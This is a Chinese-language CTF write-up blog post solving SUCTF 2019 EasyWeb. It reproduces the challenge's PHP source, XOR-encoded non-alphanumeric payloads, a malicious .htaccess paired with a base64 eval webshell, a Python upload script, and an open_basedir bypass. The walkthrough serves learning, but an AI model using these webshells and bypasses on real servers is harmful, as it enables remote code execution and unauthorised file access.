<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="SUCTF 2019 EasyWeb"><meta name="keywords" content=""><meta name="author" content="m0nk3y"><meta name="copyright" content="m0nk3y"><title>SUCTF 2019 EasyWeb | m0nk3y's Blog @ D0g3</title><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210525190222.jpeg"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css"><script src="https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js"></script><script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '5.1.1'
} </script><meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/atom.xml" title="m0nk3y's Blog @ D0g3" type="application/atom+xml">
</head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">解题分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP-%E4%B8%AD%E5%BC%82%E6%88%96-%E7%9A%84%E6%A6%82%E5%BF%B5"><span class="toc-number">2.</span> <span class="toc-text">PHP 中异或(^)的概念</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP-%E4%B8%AD%E5%8F%96%E5%8F%8D-%E7%9A%84%E6%A6%82%E5%BF%B5"><span class="toc-number">3.</span> <span class="toc-text">PHP 中取反(~)的概念</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E4%B8%8D%E7%94%A8%E6%95%B0%E5%AD%97%E6%9E%84%E9%80%A0%E6%95%B0%E5%AD%97"><span class="toc-number">4.</span> <span class="toc-text">如何不用数字构造数字</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%9E%84%E9%80%A0%E6%97%A0%E5%AD%97%E7%AC%A6webshell"><span class="toc-number">5.</span> <span class="toc-text">如何构造无字符webshell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#More"><span class="toc-number">6.</span> <span class="toc-text">More</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">7.</span> <span class="toc-text">参考资料</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210525190222.jpeg"></div><div class="author-info__name text-center">m0nk3y</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">65</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">56</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">9</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://www.google.com">Google</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200825211012.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">m0nk3y's Blog @ D0g3</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a><a class="site-page" href="/about">About</a><a class="site-page" href="/link">Friends</a><a class="site-page" href="/mytalk">Talk</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">SUCTF 2019 EasyWeb</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-03-27</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/Writeup/">Writeup</a><div class="post-meta-wordcount"><span>Word count: </span><span class="word-count">2.6k</span><span class="post-meta__separator">|</span><span>Reading time: 11 min</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="解题分析"><a href="#解题分析" class="headerlink" title="解题分析"></a>解题分析</h1><p>这题涉及多个知识点, 故单独开一篇文章学习记录一下.</p>
<p>首先是源码: </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!!</span></span><br><span class="line">    $userdir = <span class="string">&quot;upload/tmp_&quot;</span> . md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!file_exists($userdir)) &#123;</span><br><span class="line">        mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($_FILES[<span class="string">&quot;file&quot;</span>])) &#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name, <span class="string">&quot;.&quot;</span>) + <span class="number">1</span>); <span class="comment">// 获取文件的后缀</span></span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&quot;/ph/i&quot;</span>, $extension)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); <span class="comment">// 后缀不能出现 ph</span></span><br><span class="line">        <span class="keyword">if</span> (mb_strpos(file_get_contents($tmp_name), <span class="string">&#x27;&lt;?&#x27;</span>) !== <span class="literal">False</span>) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); <span class="comment">// 文件内容不能出现 <span class="meta">&lt;?</span></span></span><br><span class="line">        <span class="keyword">if</span> (!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); <span class="comment">// 用GIF89a 文件头绕过即可</span></span><br><span class="line">        $path = $userdir . <span class="string">&quot;/&quot;</span> . $name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path); <span class="comment">// 以数组的形式打印出上传文件的路径</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[<span class="string">&#x27;_&#x27;</span>]; <span class="comment">// 通过GET方法得到一个 _ 参数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$hhh) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (strlen($hhh) &gt; <span class="number">18</span>) &#123; <span class="comment">// 不能超过 18 个字符</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;One inch long, one inch strong!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, $hhh))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Try something else!&#x27;</span>);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span> (strlen($character_type) &gt; <span class="number">12</span>) <span class="keyword">die</span>(<span class="string">&quot;Almost there!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>从源码中,我们知道, 这里肯定会利用无字母getshell,只不过<strong>如何传这个webshell???</strong> 唯一一个含有文件操作的就是这里的<code>get_the_flag</code> 函数了</p>
<p>但是还是不知道如何操作,故看了一波WP, 一看知识点那么多,我靠,赚大了!!!</p>
<blockquote>
<p>知识点一 : </p>
<p>php 在获取 HTTP GET 参数的时候,默认是获得字符串类型, php中, 可以用<code>!</code> 逻辑非操作符来进行布尔值的转换</p>
</blockquote>
<p>php &gt; var_dump(@a);<br>string(1) “a”<br>php &gt; var_dump(!@a);<br>bool(false)<br>php &gt; var_dump(!!@a);<br>bool(true)</p>
<blockquote>
<p>知识点二: </p>
<p>利用php 的经典特性 “Use of undefined constant”, 会将代码中没有引号的字符都自动作为字符串, 7.2 版本提出要被废除, 但是现目前有用(从官方WP中,copy过来)</p>
</blockquote>
<p>利用这一特性,可以绕过正则表达式对单双引号的过滤, 这也是为什么 <code>&lt;?php @eval($_POST[A]);?&gt;</code> 的时候,那个 A 可以不用单引号的原理了! 😄</p>
<blockquote>
<p>知识点三: </p>
<p>ASCII码大于 <code>0x7F</code> 的字符都会被当做字符串,而和<code>0xFF</code> 异或 相当于 取反, 可以绕过被过滤的取反符号</p>
</blockquote>
<p>由于题目源码中ban 掉了 <code>ph</code> 所以我们不能上传任何和<code>ph</code> 有关的文件(当然这里不区分大小写), 但是没有过滤<code>.htaccess</code>  那么我们就可以利用上传<code>.htaccess</code> 文件,让其将所有文件都当做php来执行即可</p>
<p>以往我们用的 .htaccess 文件, 但是这里对上传的内容进行了判断, 但是我们又不能再这个文件里直接添加图片头, 因为这 .htaccess 不能正常解析</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application&#x2F;x-httpd-php</span><br></pre></td></tr></table></figure>

<p>但这里htaccess也要考虑一些东西，首先必须要可以让htaccess文件正确解析，但是还得符合图片的格式，<strong>在htaccess中#可以注释，还有一种就是把该行用\x00开头，这样配置文件也会把该行作为无效行解析</strong>，<strong>既然这样，我们就有两种绕过手段，第一种是使用注释来标记文件头，第二种是文件头以\x00开头的文件</strong></p>
<p><a target="_blank" rel="noopener" href="https://thibaud-robin.fr/articles/bypass-filter-upload/">https://thibaud-robin.fr/articles/bypass-filter-upload/</a></p>
<p>故可以上传这样的文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#define width 1</span><br><span class="line">#define height 1</span><br><span class="line">AddType application&#x2F;x-httpd-php .txt</span><br><span class="line">php_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;路径&#x2F;shell.txt&quot;</span><br></pre></td></tr></table></figure>

<p>意思是: </p>
<ul>
<li>将文件后缀为 .txt 的文件以 php文件进行解析</li>
<li>shell.txt 加载完毕后, 再次包含base64编码(注意这里是对其进行解码)的shell.txt 使其执行php代码,从而getshell.</li>
</ul>
<p>题目还对文件内容和格式进行了限制,那么这里也很简单啦., 直接用图片头和php的<code>short open_tag</code> 即 <code>&lt;? ?&gt;</code> 或 <code>&lt;?= ?&gt;</code> 来绕过, 这里可以直接对文件内容进行base64 编码即可绕过对内容的判断</p>
<p>但是, 这里由于正则的限制,需要对数据进行进制转换, 在处理的时候和平时有一些区别.</p>
<p>正常情况下的一句话 <code>&lt;?php eval($_POST[1]);?&gt;</code> 但是这里为了配合.htaccess 中的配置, 所以需要对其base64编码,并且还要添加图片头</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200328005512.png"></p>
<p><code>GIF89a12PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+</code> 这里在GIF89a 后添加 12 是为了补足8个字节让其符合base64的格式,具体原理没有去研究</p>
<p>使用这个脚本来获取到异或后的字符: </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$l = <span class="string">&quot;&quot;</span>;</span><br><span class="line">$r = <span class="string">&quot;&quot;</span>;</span><br><span class="line">$argv = str_split(<span class="string">&quot;_GET&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($argv); $i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; <span class="number">255</span>; $j++) &#123;</span><br><span class="line">        $k = chr($j) ^ chr(<span class="number">255</span>);</span><br><span class="line"><span class="comment">//        \\dechex(255) = ff</span></span><br><span class="line">        <span class="keyword">if</span> ($k == $argv[$i]) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($j &lt; <span class="number">16</span>) &#123;</span><br><span class="line">                $l .= <span class="string">&quot;%ff&quot;</span>;</span><br><span class="line">                $r .= <span class="string">&quot;%0&quot;</span> . dechex($j);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $l .= <span class="string">&quot;%ff&quot;</span>;</span><br><span class="line">            $r .= <span class="string">&quot;%&quot;</span> . dechex($j);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\&#123;$l`$r\&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">// 输出为 \&#123;%ff%ff%ff%ff`%a0%b8%ba%ab\&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?_&#x3D;$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff&#x3D;phpinfo</span><br><span class="line">?_&#x3D;$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff&#x3D;get_the_flag</span><br></pre></td></tr></table></figure>

<p>得到phpinfo 之后, 在buu上直接把flag放在里面了… 但是为了完整的复现这个流程,就不用管f不f,flag的事了…….</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200328001242.png"></p>
<p>这里发现使用了open_basedir, 将可访问的文件限制在了 /var/www/html/ 和 /tmp 目录下,绕过open_basedir  具体可以学习: </p>
<ul>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4720">https://xz.aliyun.com/t/4720</a></li>
<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/bypass-open-basedir-readfile.html">https://www.leavesongs.com/bypass-open-basedir-readfile.html</a></li>
</ul>
<p>这道题用类似这种的 <code>chdir(&#39;xxx&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);echo(file_get_contents(&#39;flag&#39;));</code> 来绕过</p>
<p>这样思路就明确了, 利用上面的特性和php动态执行函数的特点,来调用get_the_flag函数,然后上传webshell, 利用 .htaccess 文件解析漏洞解析PHP, 利用chdir函数和ini_set()来绕过 open_basedir</p>
<p>如何来上传这个文件, 方法一: 使用python 写脚本, 方法二: 我认为可以用 curl 来传(后面试试)</p>
<p>在我写脚本之前, 我发现, 这个路径的确定,还要自己来确定一下, 在phpinfo里面得到REMOTE_ADDR 然后自己去md5加密一下,,,, 因为自己tcl, 所以只想到了通过这种方法来获取文件上传的路径的方法,如果有更好方法,欢迎留言交流.</p>
<p>确定路径为 <code>upload/tmp_373102e0ce08f8c2eb7333a31ab15723/shell.txt</code> </p>
<p>后面再进行上传的时候,发现回来的路径和自己去md5的路径不一样..改一下就是了,我也不知道为什么会不一样</p>
<p>然后就可以改写上面的.htaccess了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#define width 1</span><br><span class="line">#define height 1</span><br><span class="line">AddType application&#x2F;x-httpd-php .txt</span><br><span class="line">php_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;tmp_373102e0ce08f8c2eb7333a31ab15723&#x2F;shell.txt&quot;</span><br></pre></td></tr></table></figure>

<p>shell.txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a12PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">file_htaccess = <span class="string">b&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">#define width 1</span></span><br><span class="line"><span class="string">#define height 1</span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .txt</span></span><br><span class="line"><span class="string">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_76d9f00467e5ee6abc3ca60892ef304e/shell.txt&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">file_shell_txt = <span class="string">b&quot;GIF89a&quot;</span> + <span class="string">b&quot;aa&quot;</span> + base64.b64encode(<span class="string">b&quot;&lt;?php eval($_GET[A]);?&gt;&quot;</span>)</span><br><span class="line">url = <span class="string">&quot;http://f2a7caa1-9b05-420b-85aa-ec06cb6444fd.node3.buuoj.cn/?_=$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=get_the_flag&quot;</span></span><br><span class="line"><span class="comment"># 文件上传的格式, 先上传.htaccess</span></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;.htaccess&#x27;</span>, file_htaccess, <span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">data = &#123;<span class="string">&#x27;upload&#x27;</span>: <span class="string">&#x27;Submit&#x27;</span>&#125;</span><br><span class="line">r = requests.post(url=url, data=data, files=files)</span><br><span class="line">print(r.text)</span><br><span class="line"><span class="comment"># 再上传 shell.txt</span></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;shell.txt&#x27;</span>, file_shell_txt, <span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">r = requests.post(url=url, data=data, files=files)</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>然后绕过open_basedir 执行php code即可</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200328014226.png" alt="列出根目录"></p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200328014227.png" alt="将文件以字符串的形式读取处来"></p>
<h1 id="PHP-中异或-的概念"><a href="#PHP-中异或-的概念" class="headerlink" title="PHP 中异或(^)的概念"></a>PHP 中异或(^)的概念</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;A&quot;</span>^<span class="string">&quot;?&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出为 <code>~</code>  在PHP 中对两个变量进行异或操作是, 先将字符串转换成ASCII 值,然后再将ASCII 值转换成 二进制 进行异或, 然后将得到的二进制转为ASCII 值, 再转换成字符串</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A的ASCII值是65，对应的二进制值是01000001</span><br><span class="line"></span><br><span class="line">?的ASCII值是63，对应的二进制值是00111111</span><br><span class="line"></span><br><span class="line">异或的二进制的值是10000000</span><br></pre></td></tr></table></figure>

<h1 id="PHP-中取反-的概念"><a href="#PHP-中取反-的概念" class="headerlink" title="PHP 中取反(~)的概念"></a>PHP 中取反(~)的概念</h1><p>比如汉字”和”</p>
<p>在python中: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(&quot;和&quot;.encode(&#39;utf8&#39;))</span><br><span class="line">b&#39;\xe5\x92\x8c&#39;</span><br><span class="line">&gt;&gt;&gt; print(&quot;和&quot;.encode(&#39;utf8&#39;)[2])</span><br><span class="line">140</span><br><span class="line">&gt;&gt;&gt; print(~&quot;和&quot;.encode(&#39;utf8&#39;)[2])</span><br><span class="line">-141</span><br></pre></td></tr></table></figure>

<blockquote>
<p>“和”的第三个字节的值为140[0x8c]，取反的值为-141。<br>负数用十六进制表示，通常用的是补码的方式表示。负数的补码是它本身的值每位求反,最后再加一。141的16进制为0xff73，php中chr(0xff73)==115，115就是s的ASCII值。</p>
</blockquote>
<p>因此: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php &gt; $_&#x3D;&quot;和&quot;;</span><br><span class="line">php &gt; print(~($_&#123;2&#125;));</span><br><span class="line">s</span><br><span class="line">php &gt; print(~&quot;\x8c&quot;);</span><br><span class="line">s</span><br></pre></td></tr></table></figure>

<p>贴上 Smi1e 师傅的脚本: </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">shell</span>):</span></span><br><span class="line"><span class="meta">... </span>    hexbit=<span class="string">&#x27;&#x27;</span>.join(map(<span class="keyword">lambda</span> x: hex(~(-(<span class="number">256</span>-ord(x)))),shell))</span><br><span class="line"><span class="meta">... </span>    print(hexbit)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>get(<span class="string">&#x27;phpinfo&#x27;</span>)</span><br><span class="line"><span class="number">0x8f0</span>x970x8f0x960x910x990x90</span><br></pre></td></tr></table></figure>



<h1 id="如何不用数字构造数字"><a href="#如何不用数字构造数字" class="headerlink" title="如何不用数字构造数字"></a>如何不用数字构造数字</h1><p>简单来说,就一句话 =&gt; 利用php弱类型和自增运算, true+true = 2 </p>
<p>另外, 在php 中 未定义的变量默认值为 <code>null</code> <code>null==false==0</code> </p>
<h1 id="如何构造无字符webshell"><a href="#如何构造无字符webshell" class="headerlink" title="如何构造无字符webshell"></a>如何构造无字符webshell</h1><p><strong>将非字母、数字的字符经过各种变换，最后能构造出a-z中任意一个字符。然后再利用PHP允许动态函数执行的特点，拼接处一个函数名，如”assert”，然后动态执行即可。</strong></p>
<h1 id="More"><a href="#More" class="headerlink" title="More"></a>More</h1><p>webshell 如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$a = (%<span class="number">9</span>e ^ %ff).(%<span class="number">8</span>c ^ %ff).(%<span class="number">8</span>c ^ %ff).(%<span class="number">9</span>a ^ %ff).(%<span class="number">8</span>d ^ %ff).(%<span class="number">8</span>b ^ %ff);</span><br><span class="line">\\assert</span><br><span class="line">$b = <span class="string">&quot;_&quot;</span> . (%af ^ %ff).(%b0 ^ %ff).(%ac ^ %ff).(%ab ^ %ff);$c = $$b;</span><br><span class="line">\\$b = $_POST</span><br><span class="line">$a($c[<span class="number">777</span>]);</span><br></pre></td></tr></table></figure>

<p>payload: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?_&#x3D;$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;(&quot;type index.php&quot;);&amp;%ff&#x3D;system</span><br><span class="line">POST发包: </span><br><span class="line">777&#x3D;phpinfo();</span><br></pre></td></tr></table></figure>

<p>这样可以执行任何的命令</p>
<p>另外,</p>
<p>获取本题的payload还可以用python</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">find = [<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;_&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">        result = chr(i^j)</span><br><span class="line">        <span class="keyword">if</span>(result <span class="keyword">in</span> find):</span><br><span class="line">            a = i.to_bytes(<span class="number">1</span>,byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">            b = j.to_bytes(<span class="number">1</span>,byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">            a = urllib.parse.quote(a)</span><br><span class="line">            b = urllib.parse.quote(b)</span><br><span class="line">            print(<span class="string">&quot;%s:%s^%s&quot;</span>%(result,a,b))</span><br></pre></td></tr></table></figure>





<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>参考资料也就是学习资料! 多学习他人的思路</p>
<p><a target="_blank" rel="noopener" href="https://lihuaiqiu.github.io/2019/08/27/SUCTF2019/">https://lihuaiqiu.github.io/2019/08/27/SUCTF2019/</a></p>
